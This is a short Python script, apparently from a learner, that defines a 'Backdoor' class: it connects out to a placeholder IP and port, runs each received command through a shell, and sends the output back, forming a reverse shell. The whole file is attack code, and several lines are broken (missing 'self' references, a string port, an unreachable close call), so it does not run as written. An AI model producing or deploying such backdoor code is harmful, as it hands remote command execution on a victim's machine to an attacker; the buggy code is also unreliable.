import socket 
import subprocess

class Backdoor:
    def __init__(self , ip , port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
        

    def execute_system_command(command):
        return subprocess.check_output(command, shell=True)

    def run(self):
        while True:

            command = connection.recv(1024)

            command_result = execute_system_command(command)

            connection.send(command_result)

        connection.close()


my_backdoor = Backdoor("ip" , "port")
my_backdoor.run()
